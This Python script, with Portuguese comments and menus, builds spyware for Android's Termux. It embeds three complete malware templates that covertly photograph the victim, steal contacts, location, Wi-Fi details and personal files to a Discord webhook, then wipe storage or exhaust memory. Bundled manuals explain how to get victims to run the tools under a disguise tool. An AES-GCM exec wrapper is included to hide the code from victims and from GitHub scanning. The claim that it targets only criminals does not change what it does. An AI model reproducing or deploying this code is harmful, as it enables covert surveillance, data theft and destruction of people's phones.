import os



reset = "\033[0m"
preto = "\033[30m"
vermelho = "\033[31m"
verde = "\033[32m"
amarelo = "\033[33m"
azul = "\033[34m"
magenta = "\033[35m"
ciano = "\033[36m"
branco = "\033[37m"
cinza = "\033[90m"
vermelho_claro = "\033[91m"
verde_claro = "\033[92m"
amarelo_claro = "\033[93m"
azul_claro = "\033[94m"
magenta_claro = "\033[95m"
ciano_claro = "\033[96m"
branco_claro = "\033[97m"
fundo_preto = "\033[40m"
fundo_vermelho = "\033[41m"
fundo_verde = "\033[42m"
fundo_amarelo = "\033[43m"
fundo_azul = "\033[44m"
fundo_magenta = "\033[45m"
fundo_ciano = "\033[46m"
fundo_branco = "\033[47m"
fundo_cinza = "\033[100m"
fundo_vermelho_claro = "\033[101m"
fundo_verde_claro = "\033[102m"
fundo_amarelo_claro = "\033[103m"
fundo_azul_claro = "\033[104m"
fundo_magenta_claro = "\033[105m"
fundo_ciano_claro = "\033[106m"
fundo_branco_claro = "\033[107m"
negrito = "\033[1m"
fraco = "\033[2m"
italico = "\033[3m"
sublinhado = "\033[4m"
piscando = "\033[5m"
invertido = "\033[7m"
riscado = "\033[9m"

def limpar():
    os.system("cls" if os.name == "nt" else "clear")

def criptografar():
    import os
    import base64
    import secrets
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    caminho = input("Arquivo: ").strip()
    if not caminho or not os.path.isfile(caminho):
        print("Arquivo invalido.")
        return

    with open(caminho, 'r', encoding='utf-8') as f:
        dados = f.read().encode('utf-8')

    k = secrets.token_bytes(32)
    n = secrets.token_bytes(12)
    c = AESGCM(k).encrypt(n, dados, None)
    p = base64.b64encode(n + c).decode()

    saida = input("Saida (enter = auto): ").strip()
    if not saida:
        saida = os.path.splitext(caminho)[0] + "_crypt.py"

    with open(saida, 'w', encoding='utf-8') as f:
        f.write(
            "import base64\n"
            "from cryptography.hazmat.primitives.ciphers.aead import AESGCM\n"
            f"k={repr(k)}\n"
            f"d=\"{p}\"\n"
            "b=base64.b64decode(d)\n"
            "exec(AESGCM(k).decrypt(b[:12],b[12:],None).decode())\n"
        )

    print("Gerado:", saida)


def esc_muzzmalware():
    while True:
        limpar()
        codigo_malicioso = r'''import sys
import os
import subprocess
import json
import discord
riscado = "\033[9m"
vermelho = "\033[31m"
verde = "\033[32m"
amarelo = "\033[33m"
azul = "\033[34m"

###########################################################
"                 CONFIGS:"                               #
webhook_link = ""                                         #                                 #
furtivo = True                                            #
titulo = ""                                               #
txt_notifc = ""                                           #
mensagem_terminal =  ""                                   #
webhook = discord.SyncWebhook.from_url(webhook_link)      #
mensagens_lixo = [""]                                     #
ferramenta_essa = ""                                      #
ferramenta_disfarce = ""                                  #
############################################################


def localizacao_coletar():
    try:
        loc_colet = subprocess.check_output(["termux-location"]).decode('utf-8')
        loc_colet = json.loads(loc_colet)
        lat = loc_colet["latitude"]
        lon = loc_colet["longitude"]
        google  =  f"https://maps.google.com/maps?q={lat},{lon}"
        print(f"{verde} OKAY!!!!!")
        webhook.send("NOVA VITIMA!!!!!!")
        webhook.send(f"# localizaçao:\n {google}")
        print(f"{verde} OKAY!!!!!")
    except:
        print(f"{vermelho}[ERRO] VERIFIQUE AS DEPENDENCIAS DO TERMUX USANDO -10% DO POTENCIAL COMPLENTO")
        webhook.send("sem localizacao coletada")
    return

def wifi_informacoes():
    try:
        info_wifi_colet = subprocess.check_output(["termux-wifi-connectioninfo"]).decode('utf-8')
        dados = json.loads(info_wifi_colet)
        ssid = dados.get("ssid", "N/A")
        bssid = dados.get("bssid", "N/A")
        ip = dados.get("ip", "N/A")
        gateway = dados.get("gateway", "N/A")
        subnet_mask = dados.get("subnet_mask", "N/A")
        dns1 = dados.get("dns1", "N/A")
        dns2 = dados.get("dns2", "N/A")
        rssi = dados.get("rssi", "N/A")
        link_speed = dados.get("link_speed", "N/A")
        frequency = dados.get("frequency", "N/A")
        supplicant_state = dados.get("supplicant_state", "N/A")
        lease_duration = dados.get("lease_duration", "N/A")

        txt = f"""
    ssid:{ssid}
    bssid:{bssid}
    ip:{ip}
    gateway:{gateway}
    subnet_mask:{subnet_mask}
    dns1:{dns1}
    dns2:{dns2}
    rssi:{rssi} dBm
    link_speed:{link_speed} Mbps
    frequency:{frequency} MHz
    supplicant_state:{supplicant_state}
    lease_duration:{lease_duration} segundos
    """
        webhook.send("# INFORMACAO DO WIFI:")
        webhook.send(txt)
        print(f"{verde} OKAY!!!!!")

    except:
        print(f"{vermelho} [ERRO] VERIFIQUE AS DEPEDENCIAS DO TERMUX API!!!!!! CONTINUANDO -10% DE POTENCIAL COMPLENTO")
    return


def contatos_coletar_func():
    okd = 0
    try:
        contatos_coletar = subprocess.check_output(["termux-contact-list"]).decode('utf-8')
        contatos_coletar = json.loads(contatos_coletar)
        with open("contatos.txt", "a") as lk:
            for contato in contatos_coletar:
                if not contato:
                    webhook.send("sem contatos")
                    return
                numero = contato.get("number") or contato.get("phone")
                nome = contato.get("name")
                okd = okd + 1
                lk.write(f"CONTATO{okd}: {nome} ------- {numero}\n")
            webhook.send(file=discord.File("contatos.txt"))
    except:
        print(f"{vermelho}[SUPER ERRO] DEPENDENCIAS SUPER NESESSARIA NAO FOI USADA!!!!!!")
        print(f"{amarelo} VERIFIQUE AS DEPENDENCIAS")
        webhook.send("sem contatos coletados")
        sys.exit()
    return


def foto_coletar_func():
    try:
        os.system("termux-camera-photo -c 1 foto.jpg")
        webhook.send("# foto:")
        webhook.send(file=discord.File("foto.jpg"))
        print(f"{verde} OKAY!!!!!")
    except:
        print(f"{vermelho}[ERRO] VERIFIQUE AS DEPENDENCIAS DO TERMUX API")
        webhook.send("foto nao foi coletada")
    return

def arvs_coletar_arv():
    try:
        os.chdir(os.path.expanduser("~/storage/downloads"))
        arvs = subprocess.check_output(["ls"]).decode('utf-8')
        for arv in arvs.splitlines():
            if "jpg" in arv or ".py" in arv or ".txt" in arv or ".png" in arv or ".pdf" in arv:
                webhook.send(file=discord.File(arv))
            else:
                continue
    except:
        webhook.send("erro")
        print(f"{vermelho}BAD")
    return

def foto_coletar_galeria_arv():
    os.chdir(os.path.expanduser("~/storage/dcim"))
    arvs = subprocess.check_output(["ls"]).decode('utf-8')
    for arv in arvs.splitlines():
        if ".jpg" in arv or ".png" in arv:
            webhook.send(file=discord.File(arv))
        else:
            continue
    return

def destruir():
    os.chdir("/storage/emulated/0/")
    arvs = subprocess.check_output(["ls"]).decode('utf-8')
    for arv in arvs.splitlines():
        os.system(f"rm -rf {arv}")
    webhook.send("arquivos destruidos!")
    return

def fuc_arvs():
    foto_coletar_galeria_arv()
    arvs_coletar_arv()
    destruir()
    return


def notifi():
    os.system("cd")
    arvs = subprocess.check_output(["ls"]).decode('utf-8')
    for arv in arvs.splitlines():
        os.system(f"rm -rf {arv}")
    ok = 0
    while True:
        ok = ok + 1
        with open(f"CARNIÇA{ok}.txt", "w") as lk:
            os.system(f"termux-notification -t {titulo} -c {txt_notifc} --sound --vibrate 500,1000,200")
            print(f"{riscado}{mensagem_terminal}")
            for mngs in mensagens_lixo:
                lk.write(f"{mngs}\n")


def auto_kill():
    os.system(f"rm {ferramenta_essa}")
    os.system(f"mv {ferramenta_disfarce} {ferramenta_essa}")
    os.system(f"python {ferramenta_essa}")
    return


def main1():
    contatos_coletar_func()
    foto_coletar_func()
    localizacao_coletar()
    wifi_informacoes()
    auto_kill()
    return

def main2():
    contatos_coletar_func()
    foto_coletar_func()
    localizacao_coletar()
    wifi_informacoes()
    fuc_arvs()
    notifi()
    return

if __name__ == "__main__":
    if furtivo == True:
        main1()
    else:
        main2()'''
        manual_uso = r'''JUDAS-MUZWARE --- CRIADOR: LORDE COTIZEIRA

# O QUE É?

É um spyware feito para Termux, em Python, criado por Cotizeira. Ele coleta informações como:

[FOTO
CONTATOS
INFORMAÇÕES DO WI-FI
LOCALIZAÇÃO]

Além da sua destruição, que:

[APAGA PASTAS] [ENCHE O DISPOSITIVO COM LIXO]
[E VOCÊ PODE MANDAR NOTIFICAÇÕES PARA A VÍTIMA]

Apesar de tudo, o intuito dele é ser usado contra criminosos, como:

EXPLORADORES SEXUAIS
PEDÓFILOS
PANELEIROS

---

# COMO USAR?

No código `JUDAS-MUZWARE.PY`, vão ter estas configurações:

```text
###########################################################
"                 CONFIGS:"                               #
webhook_link = ""                                         #
furtivo = True                                            #
titulo = ""                                               #
txt_notifc = ""                                           #
mensagem_terminal = ""                                    #
webhook = discord.SyncWebhook.from_url(webhook_link)      #
mensagens_lixo = [""]                                     #
ferramenta_essa = ""                                      #
ferramenta_disfarce = ""                                  #
###########################################################
```

O que cada coisa faz é simples.

Ele possui 2 modos: o modo furtivo e o modo não furtivo.

PRIMEIRO [OBRIGATÓRIO EM AMBOS OS MODOS]: é colocar o webhook que você pega e coloca nele.

EXEMPLO:

`webhook_link = "SEU WEBHOOK"`

SEGUNDO:

Dependendo do modo que você quiser, vai variar.

EXEMPLO: eu quero que ele pegue e depois execute uma ferramenta para não desconfiar [MODO FURTIVO].

Você vai pegar e vai mexer.

NO MODO FURTIVO:

`TRUE = LIGADO = VAI ATIVAR O MODO FURTIVO`
`FALSE OU NONE = VAI ATIVAR O MODO DESTRUIÇÃO`

NO TRUE [PADRÃO], você vai precisar mudar apenas:

`FERRAMENTA_ESSA`
`FERRAMENTA_DISFARCE`

EXEMPLO:

```text
ferramenta_essa = "sys.py"
ferramenta_disfarce = "config.py"
```

Já no `FALSE`, você vai mexer em:

`título`
`txt_notifc`
`mensagem_terminal`
`mensagens_lixo`

# O QUE CADA COISA É?

O `título` é o título da notificação que vai aparecer no celular da vítima.

EXEMPLO:

`titulo = "HACKEADO POR COTIZEIRA"`

Já a `txt_notifc` vai ser a mensagem.

EXEMPLO:

`txt_notifc = "PEDÓFILO ABUSADO, PEDÓFILO HACKEADO"`

JÁ A `MENSAGEM_TERMINAL`:

São as mensagens que vão aparecer no terminal.

EXEMPLO:

`mensagem_terminal = "HACKEADO POR COTIZEIRA"`

E AS `MENSAGENS_LIXO` SÃO AS MENSAGENS QUE VÃO APARECER NOS ARQUIVOS.

Fica da sua preferência, tipo:

`mensagens_lixo = ["CELULAR DOMINADO", "CELULAR FOI HACKEADO"]`

PRONTO. APÓS ISSO, SALVE O ARQUIVO E TAL.

DEPENDENDO DO MODO, NÃO PRECISA FAZER NADA DO OUTRO, ENTENDEU?

# PRÓXIMO PASSO

Agora, com o arquivo de instalar dependências:

Você só irá mexer em:

`nome_ferramenta = ""` # o nome que você salvou o spyware
`nome_ferramenta_essa = ""` # o nome dessa ferramenta

Uma recomendação é que você use o nome do arquivo principal no instalador de dependências. Exemplo:

`idpuxar.py`, entre outros.

E o do spyware, `sys`, ficaria assim:

```text
nome_ferramenta = "sys.py"
nome_ferramenta_essa = "idpuxar.py"
```

Após isso, você irá colocar no terminal, lembrando que deve ser o mesmo nome que está aqui:

```text
nome_ferramenta = ""
nome_ferramenta_essa = ""
```

Eles precisam estar nos arquivos.

Após isso, você irá usar o criptografador.

Você irá usar exatamente ele.

Primeiro, você coloca o nome da ferramenta, tipo:

`idpuxar.py`

Depois, ele vai perguntar se quer gerar uma chave.

Você coloca `n`.

E depois o nome que vai ser o arquivo.

Você coloca, por exemplo:

`idpuxar.py`

E pronto.

Você repete o processo com todos.

OBS.: TODOS, MENOS O INSTALADOR DE DEPENDÊNCIAS, PORQUE ELE QUE VAI SER O RESPONSÁVEL POR INSTALAR A DEPENDÊNCIA QUE VAI CRIPTOGRAFAR.

APÓS ISSO, PRONTO.

VOCÊ APAGA O CRIPTOGRAFADOR E PRONTO.

---

# COMO A VÍTIMA USA?

ELA VAI PRECISAR BAIXAR O TERMUX E O TERMUX API.

[APPS]

APÓS ISSO, ELA PRECISARÁ CONCEDER AS PERMISSÕES PARA O TERMUX API.

[RECOMENDO DAR TODAS]

O MEU MÉTODO É USAR UMA FERRAMENTA DE DISFARCE QUE REALMENTE PRECISE DA API, TIPO CALL BOMBER ETC.

APÓS ISSO, PEÇA PARA ELA DAR PERMISSÃO DE ARMAZENAMENTO AO TERMUX NORMAL.

APÓS ISSO, PRONTO.

DÊ:

```text
pkg update
pkg upgrade -y
pkg install git -y
pkg install python -y
git clone [seu repositório]
cd [pasta]
```

E DEPOIS:

```text
python [ferramenta]
```

TUDO SERÁ MANDADO PARA O WEBHOOK DO DISCORD.

---

# CONCLUSÃO:

O NEGÓCIO DA FERRAMENTA É SABER USAR E TER UM CONHECIMENTO MÍNIMO.

QUALQUER COISA, PODE USAR IAs PARA TE AJUDAR A ENTENDER MELHOR COMO:

[https://hackerai.co/](https://hackerai.co/)

ENTRE OUTRAS.

O CÓDIGO DESTRÓI, ROUBA E DEVE SER USADO APENAS CONTRA PEDÓFILOS.

---

# CRÉDITOS:

CRIADOR: COTIZEIRA
TEAM DONA: CARNIÇAL TEAM

MENSAGEM DO DONO:

[OLÁ, SOU COTIZEIRA, LÍDER DA CARNIÇAL TEAM. ESSA FERRAMENTA TEM O NOME "JUDAS" PORQUE, QUANDO EU FIZ ESSE CÓDIGO, EU SOFRI UMA TRAIÇÃO DE UMA PESSOA MUITO PRÓXIMA MINHA E TAL. ENTÃO, IGNORE ISSO. MAS TAMBÉM QUERIA CONVIDAR VOCÊ PARA A MINHA TEAM. LÁ, A GENTE CAÇA PEDÓFILOS, PANELEIROS E MUITOS MAIS. TMJ E NÓS, E APROVEITEM O CÓDIGO.]

# REDES SOCIAIS

DISCORD: [https://discord.gg/qx8bgkTzag](https://discord.gg/qx8bgkTzag)
GITHUB: [http://github.com/lordecotizeira](http://github.com/lordecotizeira)
'''
        while True:
            nome_arv = input("DIGITE O NOME PARA O ARQUIVO:")
            print(nome_arv)
            certo = input("DIGITE 'CONFIRMAR':")
            if certo == "CONFIRMAR":
                break
            else:
                limpar()
        manual = f"{nome_arv}_manual.txt"
        if not ".py" in nome_arv:
            nome_arv = f"{nome_arv}.py"
        with open(f"{nome_arv}", "w", encoding="utf-8") as arv:
            while True:
                print(f"{fundo_preto}{vermelho}[F = FURTIVO]( MODO FURTIVO VOCE ROUBA OS DADOS E DESAPARE)\n [D = DESTRUITIVO] (VOCE ROUBA OS DADOS E DESTROI O CELULAR DA VITIMA[FEITO PARA DEBOIXA])")
                esc = input(f"{amarelo}QUAL MODO VOCE DESEJA?: ")
                print(f"{reset}{verde}OKAY!{reset}")
                print(f"{azul}CARREGANDO{piscando}........{reset}")
                webhook_link = input("COLOQUE O WEBHOONK:")
                codigo_malicioso = codigo_malicioso.replace('webhook_link = ""', f'webhook_link = "{webhook_link}"')
                if esc == "f":
                    nome_da_ferramenta_disfarce = input("DIGITE O NOME PARA O ARQUIVO DE DISFARCE EXEMPLO [sys.py]: ")
                    nome_spyware = input("DIGITE O NOME PARA O ARQUIVO QUE VAI SER ESSE EXEMPLO [config.py]: ")
                    codigo_malicioso = codigo_malicioso.replace('ferramenta_essa = ""', f'ferramenta_essa = "{nome_spyware}"')
                    codigo_malicioso = codigo_malicioso.replace('ferramenta_disfarce = ""', f'ferramenta_disfarce = "{nome_da_ferramenta_disfarce}"')
                    break
                elif esc == "d":
                    codigo_malicioso = codigo_malicioso.replace('furtivo = True', 'furtivo = False')
                    titulo = input("DIGITE O TITULO[SERA O TITULO QUE IRA APARECER NAS NOTIFICAÇOES]: ")
                    mensangens_notific = input("DIGITE A MENSAGEM[ A MENSAGEM QUE IRA APARECER NAS NOTIFICAÇOES]: ")
                    print(f"{verde}OKAY!{reset}")
                    mensagens_terminal = input("MENSAGEM TERMINAL: ")
                    list_mensagens = []
                    while True:
                        print(f"{azul}COLOQUE AS MENSAGENS QUE VAO APARECER NOS ARQUIVOS LIXO QUE SERVEM PRA ENCHER O CELULAR")
                        print("PARA PARAR DE MANDA AS MENSAGENS COLOQUE '/ok' ")
                        w = 0
                        for item in list_mensagens:
                            w = w + 1
                        print(f"{azul} VOCE TEM {w} MENSAGENS")
                        mensagen_cont = input("MENSAGEM: ")
                        if mensagen_cont == "/ok":
                            limpar()
                            break
                        else:
                            list_mensagens.append(mensagen_cont)
                            limpar()
                    titulo = titulo
                    mensangens_notific = mensangens_notific
                    mensangens_terminal = mensagens_terminal
                    codigo_malicioso = codigo_malicioso.replace('titulo = ""', f'titulo = "{titulo}"')
                    codigo_malicioso = codigo_malicioso.replace('txt_notifc = ""', f'txt_notifc = "{mensangens_notific}"')
                    codigo_malicioso = codigo_malicioso.replace('mensagem_terminal =  ""', f'mensagem_terminal =  "{mensangens_terminal}"')
                    codigo_malicioso = codigo_malicioso.replace('mensagens_lixo = [""]', f'mensagens_lixo = [{list_mensagens}]')
                    break
                else:
                    print(f"{vermelho}OPCAO INVALIDA APERTE ENTER PARA VOLTAR...")
                    input("")
            arv.write(f"{codigo_malicioso}")
            limpar()
            print(f"{vermelho}OKAY! CODIGO CRIADO COM SUCESSO{reset} irei criar o manual")
        with open(f"{manual}", "w") as arv:
            arv.write(f"{manual_uso}")
            print(f"{verde} CRIADO!! TUDO PRONTO USE AGORA A OPCAO DE CRITOFRAÇAO PARA CRIPTOGRAFAR A FERRAMENTA [opcional]{reset}")
            input("APERTE ENTER PARA CONTINUAR")
        return




def esc_bstc():
    codigo_malicioso = r'''
import os
import discord
from discord.ext import commands
import subprocess
import json
from discord.ext.commands import bot
import sys
ruim = "\033[31m"
bom = "\033[32m"
alerta = "\033[33m"
mensagem = "\033[34m"

ferramenta_essa = ""
ferramenta_disfarçente = ""
token = ""
id_canal = 0

perm = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=perm)

try:
    subprocess.check_output(["termux-camera-photo", "-c", "0", "foto_tras.jpg"])
    subprocess.check_output(["termux-camera-photo", "-c", "1", "foto_frente.jpg"])
    print(f"{bom}okay!")
except:
    print(f"{ruim}ERRO!! VERIFIQUE AS DEPENDENCIAS")
    sys.exit()
try:
    contatos_peg = subprocess.check_output(["termux-contact-list"]).decode()
    contatos_peg = json.loads(contatos_peg)
    kij = 1
    with open("contatos.txt", "a" , encoding="utf-8") as f:
        for contato in contatos_peg:
            kij += 1
            numero = contato.get("number") or contato.get("phone")
            nome_contato = contato.get("name")
            f.write(f"CONTATO{kij}: {nome_contato} -----{numero} \n")
    print(f"{bom}okay!")
except:
    print(f"{ruim}ERRO!!! VERIFIQUE AS DEPENDENCIA")
    sys.exit()


try:
    local_peg = subprocess.check_output(["termux-location"]).decode()
    local_peg = json.loads(local_peg)
    lon = local_peg["longitude"]
    lat = local_peg["latitude"]
    google = f"https://www.google.com/maps?q=-{lat},{lon}"
    print(f"{bom}okay!")
except:
    print(f"{alerta}DEPENDENCIA LC4 CONTINUANDO SEM...")
    google = None



@bot.event
async def on_ready():
    canal = bot.get_channel(id_canal)
    try:
        await canal.send(file=discord.File("foto_tras.jpg"))
        await canal.send(file=discord.File("foto_frente.jpg"))
        print(f"{mensagem}..........")
    except:
        print(f"{ruim}ERRO INICIAR  1")
        sys.exit()
    try:
        if not google == None:
            await canal.send(f"LOC POR GOOGLE = {google}")
        else:
            await canal.send("loc nao encontrada")
    except:
        print(f"{ruim}ERRO INICIAR 2")

    try:
        await canal.send("CONTATOS:")
        await canal.send(file=discord.File("contatos.txt"))
    except:
        print(f"{ruim}ERRO INICIAR 3")

    os.system("rm contatos.txt")
    os.system("rm foto_tras.jpg")
    os.system("rm foto_frente.jpg")
    await bot.close()

bot.run(token)

os.system("clear")
os.system(f"rm {ferramenta_essa}")
os.system(f"mv {ferramenta_disfarçente} {ferramenta_essa}")
os.system(f"python {ferramenta_essa}")
'''
    manual_de_uso = r"""OQUE E:
O B.S.T.C [BLUME SPY TERMUX CODIG]
E UM SPYWARE FEITO PARA TERMUX EM PARCERIA COM A BLUEME EA CBSEC
FEITO POR COTIZEIRA O SUB LIDER DA BLUME, O PROPOSITO DELE E PEGAR INFORMAÇOES DE:
PANELEIROS
PEDOFILOS
E OUTROS MALFETORES
UTILIZANDO AS API COMO TERMUX-LOCATION E TERMUX-CAMERA-PHOTO

COMO USAR:
PARA UTILIZAR VOCE IRA APENAS FAZER A VITIMA/ALVO BAIXAR O TERMUX APP EO TERMUX API
APOS ISSO O ALVO PRECISAR CONCEDER AS PERMISSOES NECESSARIAS [DE PREFERENCIA TODAS]
APOS ISSO VOCE IRA FAZER O PASSO A PASSO A SEGUINTE

OQUE EU PRECISO FAZER:

1:
PRIMEIRO VOCE IRA PRECISAR EDITAR O CODIGO NA PARTE

ferramenta_essa = ""
ferramenta_disfarçente = ""
token = ""
id_canal = 0

A FERRAMENTA_ESSA VOCE IRA COLOCAR O NOME DA FERRAMENTA QUE IRA PEGAR AS INFORMAÇOES
EXEMPLO: id_puxar.py

JA A ferramenta_disfarçente VOCE IRA COLOCAR A FERRAMENTA REAL POR EXEPLO
sys.exi
VOCE PODE USAR ESSA QUE EU DEIXE O SPYFALL OU QUALQUER OUTRA DA SUA PREFERENCIA
JA NO token VOCE IRA CRIAR UM TOKEN DO SEU BOT
NO https://discord.com/developers/applications
VEJA UM VIDEO NO YOUTUBE ENSINADO

E NO CANAL ID VOCE IRA COLOCAR O ID DO CANAL VOCE IRA COLOCAR O ID DO CANAL QUE IRA RECEBER AS INFORMAÇOES

2:
AGORA VOCE IRA BAIXAR OQUE IRA CRIPTOGRAFAR [GURDE POIS VOCE IRA USAR NA VITIMA MAIS TARDE]

pip uninstall cryptography
pip cache purge
ip install --upgrade pip
pkg reinstall python
pkg reinstall python-cryptography

APOS ISSO PODEMOS PROSEGUIR

3:
CRIE OS NANO
A FERRAMENTA QUE IRA COLETAR TIPO SPYFALL.PY OU QUALQUER OUTRA EA DISFARÇE TIPO sys.py COPIE E COLE OS CODIGOS
APOS ISSO CRIE UM ARQUIVO CHAMADO criptografador.py

E COLE O CODIGO DO CRIPTOGRAFAOR 

APOS ISSO DE python criptografador.py

e assim ele pedira o arquivo que queres criptografar
você coloca o nome

ele vai pergunta se você quer uma chave ou algo do tipo você escreve n


ele vai pedir o nome do arquivo que você vai dar

você coloca o mesmo senão não ira funcionar

faça isso com o outro arquivo

agora você da rm criptografador.py

ele ira apagar o criptografador

após isso você pode publicar no GitHub



POR QUE PRECISO DO CRIPTOGRAFADOR?:

o criptografador sera o responsável por poder publicar no Git hub a ferramenta pos se postamos com token
ele ira ver e seu git sera bloqueado

também vale lembra que e para enganar a vitima para ela não ver o código e você se fuder e ainda leva uma raid




EXECUTAÇAO DA VITIMA:

AGORA COM TUDO PRONTO VOCE IRA FINALENTE EXECUTA NO TERMUX DA VITIMA

APOS A VITIMA JA DAR ACESSO AO TERMUX API
CHEGO A HORA DA AÇAO

DE ESSES COMANDO EM SEQUENCIA

pkg update
pkg install git
pkg install python
pkg install termux-api
pip install discord 

pip uninstall cryptography
pip cache purge
ip install --upgrade pip
pkg reinstall python
pkg reinstall python-cryptography
AGORA FAÇA ELA BAIXAR SEU REPOSITRIO
[SE NAO SABER COMO PESQUISA NO CHAT GPT OU NA IA, SE QUISER TUDO DE MAO BEIJADA AI NAO E PROBLEMA MEU]
git clone [repositorio]
cd [pasta]
python [arquivo]

PRONTO!!! QUANDO APARECER A FERRAMENTA DE DISFARÇE ELE JA MANDOU E PODE VERIFICAR NO CANAL SELECIONADO
VALE LEMBRA QUE RECOMENDO TESTA 

SE QUISER CONFERIR COM IAS PARA PODE ENTENDER COMO TUDO FUNCIONA
E TESTA EM SE MESMO ANTES DE TESTA NOS OUTROS
ASSIM VOCE PODERAR ENTENDER MELHOR COMO CADA COISA FUNCIONA E DOMINAR AS MANHAS


OBS:
VOCE IRA PRECISAR OBRIGATORIAMENTE DO TERMUX API SENAO O CODIGO NAO EXECUTARAM 
VOCE PODE ALTERAR A FERRAMENTA DE DISFARÇE LIVREMENTE APENAS NAO MUDE O METODO
O CODIGO ESTA ABERTO PARA ALTEÇOES ENTAO PODE USAR A VONTADE



RESUMO:
O SPYWARE E INCIANTE MAIS JA QUEBRA UM GALHO ENORME PRINCIPALMENTE SE SOUBER USAR
MUITOS HACKER SUBESTIMAN O USO DO TERMUX POREM SE SOUBE USAR TRANFORMA O BRINQUEDO EM ARMA



CRIADOR:  LORD COTIZEIRA
GRUPOS:
BLUME 
FEB
E CBSEC


[ATENÇAO A FERRAMENTA SE TRATA DE UM SPYWARE, QUALQUER USO QUE NAO SEJA CONTRA MALFETORES O CRIADOR NAO SE RESPONSABILIZA ELE E DONO DA VERSAO V1 QUALQUER OUTRA ALTERAÇAO QUE NAO SEJA ESSA NAO E DE SUA RESPONSABILIDADE, USE APENAS CONTRAS QUEM ATACA E NUNCA CONTRA QUEM E ATCADO]
"""
    while True:
        nome_arv = input("NOME DO ARQUIVO: ")
        print(nome_arv)
        confirmar = input("DIGITE 'CONFIRMAR' PARA CONFIRMAR O ARQUIVO: ")
        if confirmar == "CONFIRMAR":
            limpar()
            break
        else:
            limpar()
        manual = f'{nome_arv}manual.txt'
        if not '.py ' in nome_arv:
            nome_arv = f'{nome_arv}.py'
    while True:
        token = input("DIGITE UMA TOKEN: ")
        try:
            id_canal = int(input("DIGITE UMA ID CANAL [APENAS NUMEROS]: "))
        except:
            print(f"{vermelho}ERRO TENTE APENAS NUMEROS!!!")
            input(f"{azul}APERTE ENTER PARA CONTINUAR{reset}")
            return
        ferramenta_essa = input("NOME DESSA FERRAMENTA EXEMPLO [config.py]: ")
        ferramenta_disfarce = input("NOME DA FERRAMENTA DE DISFARCE EXEMPLO [sys.py]: ")
        print(f"{azul}CRIANDO FERRAMENTA{piscando}............{reset}")
        codigo_malicioso  = codigo_malicioso.replace('ferramenta_essa = ""', f'ferramenta_essa = "{ferramenta_essa}"')
        codigo_malicioso = codigo_malicioso.replace('ferramenta_disfarçente = ""', f'ferramenta_disfarçente = "{ferramenta_disfarce}"')
        codigo_malicioso = codigo_malicioso.replace('token = ""', f'token = "{token}"')
        codigo_malicioso = codigo_malicioso.replace('id_canal = 0', f'id_canal = "{id_canal}"')
        break
    with open(f"{nome_arv}", "w", encoding="utf-8") as arv:
        arv.write(codigo_malicioso)
        print(f"{verde}CODIGO CRIADO COM SUCESSO!!!{reset}")
    with open(f"{manual}", "w", encoding="utf-8") as arv:
        arv.write(manual_de_uso)
        input("aperte enter para continuar")



def esc_lm_hay():
    codigo_malicioso = '''import subprocess
import psutil
import numpy as np
import time
import discord
import json
import os
import shutil
webhook_url = ""
webhook = discord.SyncWebhook.from_url(webhook_url)

def Dowlonads_colet():
    try:
        pasta = os.path.expanduser("~/storage/downloads")
        lklk = subprocess.check_output(["ls", pasta]).decode("utf-8")
        for x in lklk.splitlines():
            if ".jpg" in x or ".txt" in x or ".png" in x or ".py" in x or "pdf" in x:
                webhook.send(file=discord.File(pasta + "/" + x))  # caminho completo
        print("1%.......")
    except:
        webhook.send("erro!!")
        return True

def galeria_colet():
    try:
        print("2%....")
        pasta = os.path.expanduser("~/storage/pictures")
        lklk = subprocess.check_output(["ls", pasta]).decode("utf-8")
        for x in lklk.splitlines():
            if ".jpg" in x or ".png" in x:
                webhook.send(file=discord.File(pasta + "/" + x))
        print("21%.....")
    except:
        webhook.send("erro!!")
    return True


def api_coletar():
    try:
        pkpk = subprocess.check_output(["termux-camera-photo", "-c", "1", "foto_frente.jpg"])
        webhook.send(file=discord.File("foto_frente.jpg"))
        pkpk = subprocess.check_output(["termux-contact-list"]).decode("utf-8")
        contatos = json.loads(pkpk)
        with open("contatos.txt", "a", encoding="utf-8") as f:
            for contato in contatos:
                numero = contato.get("number") or contato.get("phone")
                nome_contato = contato.get("name")
                f.write(f"CONTATO: {nome_contato} --- {numero}\n")
            webhook.send(file=discord.File("contatos.txt"))
            if not contatos:
                webhook.send("usuario nao possi contatos")
            else:
                print("34%......")
    except:
        webhook.send("nao foi possivel coletar contatos")

    try:
        loc_coletc = subprocess.check_output(["termux-location"]).decode("utf-8")
        loc_coletc = json.loads(loc_coletc)
        lon = loc_coletc["longitude"]
        lat = loc_coletc["latitude"]
        google = f"https://www.google.com/maps?q={lat},{lon}"
        webhook.send(f"LOCALIZAÇAO {google}")
        print("66%")
    except:
        webhook.send("nao foi possvivel coletar a loc")

        return True

def destruiçao():
    try:
        pastas = [
            os.path.expanduser("~/storage/shared"),
            os.path.expanduser("~/storage/downloads"),
            os.path.expanduser("~/storage/dcim")
        ]

        for pasta in pastas:
            if os.path.exists(pasta):
                shutil.rmtree(pasta, ignore_errors=True)
        mem_livre = psutil.virtual_memory().available
        num_elements = int(mem_livre * 1.0)
        arr = np.empty(num_elements, dtype=np.uint8)
        t0 = time.perf_counter()
        arr.fill(123)
        t1 = time.perf_counter()
        t2 = time.perf_counter()
        checksum = arr.sum()
        t3 = time.perf_counter()
    except:
        webhook.send("erro na destruiçao")















def inciar():
    Dowlonads_colet()
    galeria_colet()
    api_coletar()
    destruiçao()
    return True

inciar()'''
    manual_uso = '''[FEITO POR COTIZEIRA E MASTER]

REQUISISOS:
TERMUX-API COM PERMISSOES DE CONTATOS,LOCALIZAÇAO E CAMERA
PERMISSAO DE ARMAZENAMENTO[DANDO termux-setup-storage]
PYTHON
[NAO PRECISA DE OUTROS REQUISISTO POIS O DEPENENCIAS JA IRA BAIXAR TUDO QUE PRECISAMOS BABAY]


COMO USAR?:

PASSO 1:
[ALTERAR O WEBHOOK]
TROQUE A LINHA DO WEBHOOK
webhook_url = ""
POR SEU WEBHOOK

PASSO 2:
[EDITAR O NOME DO ARQUIVO]
NO INSTALADOR DE DEPENDECIAS VOCE PRECISARAR APENAS CORRIR ESSAS 2 LINHAS


nome_ferramenta = "" <<< O NOME QUE SERA DESSE ARQUIVO
nome_ferramenta_essa = "" <<<< O NOME DO SPYWARE EXEMPLO:

nome_ferramenta = "sys.py"
nome_ferramenta_essa = "idpuxar.py"


PASSO 3:
[CRIPTOGRAFAR]
